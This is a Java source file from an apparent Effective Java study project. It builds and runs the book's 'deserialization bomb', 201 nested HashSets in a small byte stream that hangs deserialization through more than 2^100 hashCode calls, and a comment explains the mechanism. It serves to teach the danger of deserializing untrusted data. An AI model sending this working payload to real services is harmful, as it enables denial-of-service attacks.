package com.testehan.effective.chpt12Serialization.item85;

import java.util.HashSet;
import java.util.Set;

import static com.testehan.effective.chpt12Serialization.item85.Util.*;


/*
    The object graph consists of 201 HashSet instances, each of which contains 3
    or fewer object references. The entire stream is 5,744 bytes long, yet the sun
    would burn out long before you could deserialize it. The problem is that
    deserializing a HashSet instance requires computing the hash codes of its
    elements. The 2 elements of the root hash set are themselves hash sets containing
    2 hash-set elements, each of which contains 2 hash-set elements, and so on,
    100 levels deep. Therefore, deserializing the set causes the hashCode method to
    be invoked over 2^100 times. Other than the fact that the deserialization is taking
    forever, the deserializer has no indication that anything is amiss. Few objects are
    produced, and the stack depth is bounded

*/

public class DeserializationBomb {

    public static void main(String[] args) throws Exception {
        System.out.println(bomb().length);
        deserialize(bomb());
    }

    static byte[] bomb() {
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();
        for (int i = 0; i < 100; i++) {
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();
            t1.add("foo"); // make it not equal to t2
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return serialize(root);
    }
}
